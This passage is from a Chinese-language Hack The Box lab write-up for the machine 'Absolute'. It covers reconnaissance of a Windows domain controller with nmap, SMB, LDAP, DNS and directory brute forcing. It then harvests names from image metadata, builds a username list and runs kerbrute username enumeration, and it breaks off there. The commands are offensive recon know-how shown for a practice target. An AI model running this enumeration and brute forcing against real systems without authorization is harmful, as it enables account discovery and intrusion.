2023-05-21T17:40:39+00:00; +7h00m00s from scanner time.</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc.absolute.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb</span><br><span class="line">| Not valid before: 2022-06-09T08:14:24</span><br><span class="line">|_Not valid after:  2023-06-09T08:14:24</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2023-05-21T17:40:40+00:00; +6h59m59s from scanner time.</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc.absolute.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb</span><br><span class="line">| Not valid before: 2022-06-09T08:14:24</span><br><span class="line">|_Not valid after:  2023-06-09T08:14:24</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2023-05-21T17:40:39+00:00; +7h00m00s from scanner time.</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp open  mc-nmf        .NET Message Framing</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port53-TCP:V=7.80%I=7%D=5/21%Time=6469F493%P=x86_64-pc-linux-gnu%r(DNSV</span><br><span class="line">SF:ersionBindReqTCP,20,<span class="string">&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\</span></span><br><span class="line"><span class="string">SF:x04bind\0\0\x10\0\x03&quot;</span>);</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   <span class="built_in">date</span>: 2023-05-21T17:40:25</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 161.96 seconds</span><br></pre></td></tr></table></figure>
+
+<p>IIS版本表明Absolute正在运行Windows 10&#x2F;Server 2016或更高版本。LDAP扫描显示了dc.absolute.htb的hostname。现在把它和基本域添加到的&#x2F;etc&#x2F;hosts文件中:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.181 dc.absolute.htb absolute.htb</span><br></pre></td></tr></table></figure>
+
+<p>有一个7小时的时差，如果要做任何Kerberos相关的认证需要注意。</p>
+<p>注意到WinRM(5985)在找到creds时是打开的</p>
+<h2 id="SMB-TCP-445"><a href="#SMB-TCP-445" class="headerlink" title="SMB - TCP 445"></a>SMB - TCP 445</h2><p>无法在没有密码的情况下连接到SMB:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># crackmapexec smb 10.10.11.181 --shares</span></span><br><span class="line">SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.181    445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># crackmapexec smb 10.10.11.181 --shares -u fd0 -p &#x27;&#x27;</span></span><br><span class="line">SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.181    445    DC               [-] absolute.htb\fd0: STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>
+
+<h2 id="LDAP-TCP-389"><a href="#LDAP-TCP-389" class="headerlink" title="LDAP - TCP 389+"></a>LDAP - TCP 389+</h2><p>Ldapsearch将给出基本命名上下文，它与absolute.htb匹配:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># ldapsearch -H ldap://dc.absolute.htb -x -s base namingcontexts</span></span><br><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;&gt; (default) with scope baseObject</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: namingcontexts</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">dn:</span><br><span class="line">namingcontexts: DC=absolute,DC=htb</span><br><span class="line">namingcontexts: CN=Configuration,DC=absolute,DC=htb</span><br><span class="line">namingcontexts: CN=Schema,CN=Configuration,DC=absolute,DC=htb</span><br><span class="line">namingcontexts: DC=DomainDnsZones,DC=absolute,DC=htb</span><br><span class="line">namingcontexts: DC=ForestDnsZones,DC=absolute,DC=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"><span class="comment"># numResponses: 2</span></span><br><span class="line"><span class="comment"># numEntries: 1</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试获取任何额外信息需要认证:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># ldapsearch -H ldap://dc.absolute.htb -x -b &quot;DC=absolute,DC=htb&quot;</span></span><br><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;DC=absolute,DC=htb&gt; with scope subtree</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: ALL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line">search: 2</span><br><span class="line">result: 1 Operations error</span><br><span class="line">text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera</span><br><span class="line"> tion a successful <span class="built_in">bind</span> must be completed on the connection., data 0, v4563</span><br><span class="line"></span><br><span class="line"><span class="comment"># numResponses: 1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="DNS-TCP-x2F-UDP-53"><a href="#DNS-TCP-x2F-UDP-53" class="headerlink" title="DNS - TCP&#x2F;UDP 53"></a>DNS - TCP&#x2F;UDP 53</h2><p>可以尝试一个zone transfer，但失败了:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># dig +noall +answer @10.10.11.181 axfr absolute.htb                                                                            1 ⨯</span></span><br><span class="line">; Transfer failed.</span><br></pre></td></tr></table></figure>
+
+<p>可以确认已经知道的两个名字:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># dig +noall +answer @10.10.11.181 absolute.htb</span></span><br><span class="line">absolute.htb.           600     IN      A       10.10.11.181</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># dig +noall +answer @10.10.11.181 dc.absolute.htb</span></span><br><span class="line">dc.absolute.htb.        1200    IN      A       10.10.11.181</span><br></pre></td></tr></table></figure>
+
+<p>用dnsenum暴力破解子域。确认在上面手动识别的内容，并通过暴力破解找到了其他子域:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># dnsenum --dnsserver 10.10.11.181 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt absolute.htb</span></span><br><span class="line">dnsenum VERSION:1.2.6</span><br><span class="line"></span><br><span class="line">-----   absolute.htb   -----</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Host<span class="string">&#x27;s addresses:</span></span><br><span class="line"><span class="string">__________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">absolute.htb.                            600      IN    A        10.10.11.181</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Name Servers:</span></span><br><span class="line"><span class="string">______________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dc.absolute.htb.                         1200     IN    A        10.10.11.181</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Mail (MX) Servers:</span></span><br><span class="line"><span class="string">___________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Trying Zone Transfers and getting Bind Versions:</span></span><br><span class="line"><span class="string">_________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">unresolvable name: dc.absolute.htb at /usr/bin/dnsenum line 900.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Trying Zone Transfer for absolute.htb on dc.absolute.htb ...</span></span><br><span class="line"><span class="string">AXFR record query failed: no nameservers</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Brute forcing with /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:</span></span><br><span class="line"><span class="string">______________________________________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dc.absolute.htb.                         1200     IN    A        10.10.11.181</span></span><br><span class="line"><span class="string">gc._msdcs.absolute.htb.                  600      IN    A        10.10.11.181</span></span><br><span class="line"><span class="string">domaindnszones.absolute.htb.             600      IN    A        10.10.11.181</span></span><br><span class="line"><span class="string">forestdnszones.absolute.htb.             600      IN    A        10.10.11.181</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">absolute.htb class C netranges:</span></span><br><span class="line"><span class="string">________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Performing reverse lookup on 0 ip addresses:</span></span><br><span class="line"><span class="string">_____________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0 results out of 0 IP addresses.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">absolute.htb ip blocks:</span></span><br><span class="line"><span class="string">________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">done.</span></span><br></pre></td></tr></table></figure>
+
+<p>然而这些都没什么用。</p>
+<h2 id="Website-TCP-80"><a href="#Website-TCP-80" class="headerlink" title="Website - TCP 80"></a>Website - TCP 80</h2><p>该网站是一个专注于设计和图像的简单页面:</p>
+<p>图像每隔几秒旋转一次。唯一的链接指向模板。</p>
+<h3 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h3><p>HTTP响应头只表示IIS，没有其他内容:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Last-Modified: Tue, 07 Jun 2022 19:29:10 GMT</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">ETag: <span class="string">&quot;0877fdca47ad81:0&quot;</span></span><br><span class="line">Server: Microsoft-IIS/10.0</span><br><span class="line">Date: Sun, 21 May 2023 23:50:51 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 2909</span><br></pre></td></tr></table></figure>
+
+<p>首页本身加载为index.html，这表明它可能只是一个静态站点。</p>
+<p>404页面看起来很像IIS默认的404。</p>
+<p>旋转的图片似乎是在一个 hero-slider 和 owl-carousel div:</p>
+<h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><p>使用feroxbuster:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># feroxbuster -u http://absolute.htb</span></span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.9.1</span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ http://absolute.htb</span><br><span class="line"> 🚀  Threads               │ 50</span><br><span class="line"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</span><br><span class="line"> 👌  Status Codes          │ All Status Codes!</span><br><span class="line"> 💥  Timeout (secs)        │ 7</span><br><span class="line"> 🦡  User-Agent            │ feroxbuster/2.9.1</span><br><span class="line"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> 🏁  HTTP methods          │ [GET]</span><br><span class="line"> 🔃  Recursion Depth       │ 4</span><br><span class="line"> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">301      GET        2l       10w      146c http://absolute.htb/js =&gt; http://absolute.htb/js/</span><br><span class="line">200      GET       85l      196w     2909c http://absolute.htb/</span><br><span class="line">301      GET        2l       10w      150c http://absolute.htb/images =&gt; http://absolute.htb/images/</span><br><span class="line">301      GET        2l       10w      147c http://absolute.htb/css =&gt; http://absolute.htb/css/</span><br><span class="line">301      GET        2l       10w      150c http://absolute.htb/Images =&gt; http://absolute.htb/Images/</span><br><span class="line">301      GET        2l       10w      149c http://absolute.htb/fonts =&gt; http://absolute.htb/fonts/</span><br><span class="line">301      GET        2l       10w      147c http://absolute.htb/CSS =&gt; http://absolute.htb/CSS/</span><br><span class="line">301      GET        2l       10w      146c http://absolute.htb/JS =&gt; http://absolute.htb/JS/</span><br><span class="line">301      GET        2l       10w      146c http://absolute.htb/Js =&gt; http://absolute.htb/Js/</span><br><span class="line">301      GET        2l       10w      147c http://absolute.htb/Css =&gt; http://absolute.htb/Css/</span><br><span class="line">301      GET        2l       10w      150c http://absolute.htb/IMAGES =&gt; http://absolute.htb/IMAGES/</span><br><span class="line">301      GET        2l       10w      149c http://absolute.htb/Fonts =&gt; http://absolute.htb/Fonts/</span><br><span class="line">301      GET        2l       10w      147c http://absolute.htb/CSS =&gt; http://absolute.htb/CSS/</span><br><span class="line">200      GET     7808l    48362w  3771054c http://absolute.htb/images/hero_4.jpg</span><br><span class="line">301      GET        2l       10w      146c http://absolute.htb/JS =&gt; http://absolute.htb/JS/</span><br><span class="line">301      GET        2l       10w      146c http://absolute.htb/Js =&gt; http://absolute.htb/Js/</span><br><span class="line">301      GET        2l       10w      147c http://absolute.htb/Css =&gt; http://absolute.htb/Css/</span><br><span class="line">200      GET     6692l    42749w  3290518c http://absolute.htb/images/hero_5.jpg</span><br><span class="line">200      GET        7l      277w    44342c http://absolute.htb/js/owl.carousel.min.js</span><br><span class="line">301      GET        2l       10w      150c http://absolute.htb/IMAGES =&gt; http://absolute.htb/IMAGES/</span><br><span class="line">403      GET       29l       92w     1233c http://absolute.htb/fonts/icomoon/</span><br><span class="line">200      GET    22590l   126364w  9918283c http://absolute.htb/images/hero_6.jpg</span><br><span class="line">301      GET        2l       10w      163c http://absolute.htb/fonts/icomoon/fonts =&gt; http://absolute.htb/fonts/icomoon/fonts/</span><br><span class="line">200      GET     1306l     7961w   733740c http://absolute.htb/images/hero_1.jpg</span><br><span class="line">200      GET      948l     7256w   690337c http://absolute.htb/images/hero_3.jpg</span><br><span class="line">200      GET      145l      442w     4030c http://absolute.htb/css/style.css</span><br><span class="line">301      GET        2l       10w      149c http://absolute.htb/Fonts =&gt; http://absolute.htb/Fonts/</span><br><span class="line">200      GET        7l      689w    63240c http://absolute.htb/js/bootstrap.min.js</span><br><span class="line">200      GET        2l     1283w    86926c http://absolute.htb/js/jquery-3.3.1.min.js</span><br><span class="line">200      GET     4919l     8218w    79820c http://absolute.htb/fonts/icomoon/style.css</span><br><span class="line">200      GET        7l     2103w   160392c http://absolute.htb/css/bootstrap.min.css</span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>
+
+<p>没发现其它有用的东西</p>
+<h1 id="Auth-as-d-klay"><a href="#Auth-as-d-klay" class="headerlink" title="Auth as d.klay"></a>Auth as d.klay</h1><h2 id="生成-Username-字典"><a href="#生成-Username-字典" class="headerlink" title="生成 Username 字典"></a>生成 Username 字典</h2><h3 id="Image-Metadata"><a href="#Image-Metadata" class="headerlink" title="Image Metadata"></a>Image Metadata</h3><p>使用一个简单的Bash循环从carousel下载六个”hero”图片，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 6); <span class="keyword">do</span> wget http://absolute.htb/images/hero_<span class="variable">$&#123;i&#125;</span>.jpg; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p>使用exiftool查看图像上的元数据:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># exiftool hero_1.jpg</span></span><br><span class="line">ExifTool Version Number         : 12.57</span><br><span class="line">File Name                       : hero_1.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 407 kB</span><br><span class="line">File Modification Date/Time     : 2022:06:07 15:45:20-04:00</span><br><span class="line">File Access Date/Time           : 2023:05:29 02:44:24-04:00</span><br><span class="line">File Inode Change Date/Time     : 2023:05:29 02:44:24-04:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">Exif Byte Order                 : Little-endian (Intel, II)</span><br><span class="line">X Resolution                    : 72</span><br><span class="line">Y Resolution                    : 72</span><br><span class="line">Resolution Unit                 : inches</span><br><span class="line">Artist                          : James Roberts</span><br><span class="line">Y Cb Cr Positioning             : Centered</span><br><span class="line">Quality                         : 60%</span><br><span class="line">XMP Toolkit                     : Image::ExifTool 11.88</span><br><span class="line">Author                          : James Roberts</span><br><span class="line">Creator Tool                    : Adobe Photoshop CC 2018 Macintosh</span><br><span class="line">Derived From Document ID        : 6413FD608B5C21D0939F910C0EFBBE44</span><br><span class="line">Derived From Instance ID        : 6413FD608B5C21D0939F910C0EFBBE44</span><br><span class="line">Document ID                     : xmp.did:887A47FA048811EA8574B646AF4FC464</span><br><span class="line">Instance ID                     : xmp.iid:887A47F9048811EA8574B646AF4FC464</span><br><span class="line">DCT Encode Version              : 100</span><br><span class="line">APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling</span><br><span class="line">APP14 Flags 1                   : (none)</span><br><span class="line">Color Transform                 : YCbCr</span><br><span class="line">Image Width                     : 1900</span><br><span class="line">Image Height                    : 1150</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)</span><br><span class="line">Image Size                      : 1900x1150</span><br><span class="line">Megapixels                      : 2.2</span><br></pre></td></tr></table></figure>
+
+<p>James Roberts是“Author” 和 “Artist”。其他的没有“Artist”，但他们都有一个“Author”字段。</p>
+<h3 id="Generate-Users-List"><a href="#Generate-Users-List" class="headerlink" title="Generate Users List"></a>Generate Users List</h3><p>有了users列表，就可以测试Kerberos，看看是否有有效的用户名。得到一个users列表:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># for i in $(seq 1 6); do exiftool hero_$&#123;i&#125;.jpg | grep Author | awk &#x27;&#123;print $3 &quot; &quot; $4&#125;&#x27;; done | tee users</span></span><br><span class="line">James Roberts</span><br><span class="line">Michael Chaffrey</span><br><span class="line">Donald Klay</span><br><span class="line">Sarah Osvald</span><br><span class="line">Jeffer Robinson</span><br><span class="line">Nicole Smith</span><br></pre></td></tr></table></figure>
+
+<p>可以采用这些方法并手工生成可能的常用用户名列表，但使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3VyYmFuYWR2ZW50dXJlci91c2VybmFtZS1hbmFyY2h5">username-anarchy<i class="fa fa-external-link-alt"></i></span>生成用户名列表更容易:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># /root/username-anarchy/username-anarchy -i users | tee usernames</span></span><br><span class="line">james</span><br><span class="line">jamesroberts</span><br><span class="line">james.roberts</span><br><span class="line">jamesrob</span><br><span class="line">jamerobe</span><br><span class="line">jamesr</span><br><span class="line">j.roberts</span><br><span class="line">jroberts</span><br><span class="line">rjames</span><br><span class="line">r.james</span><br><span class="line">robertsj</span><br><span class="line">roberts</span><br><span class="line">roberts.j</span><br><span class="line">roberts.james</span><br><span class="line">jr</span><br><span class="line">michael</span><br><span class="line">michaelchaffrey</span><br><span class="line">michael.chaffrey</span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>
+
+<h3 id="寻找有效用户名"><a href="#寻找有效用户名" class="headerlink" title="寻找有效用户名"></a>寻找有效用户名</h3><p>kerbrute是一种使用Kerberos进行暴力破解的工具。其中一个选项，userenum将检查字典中的哪些名称是有效的用户名:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># /root/kerbrute-master/kerbrute userenum --dc dc.absolute.htb -d absolute.htb usernames</span></span><br><span class="line"></span><br><span class="line">    __             __               __</span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____</span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/</span><br><span class="line"></span><br><span class="line">Version: dev (n/a) - 05/29/23 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2023/05/29 03:06:48 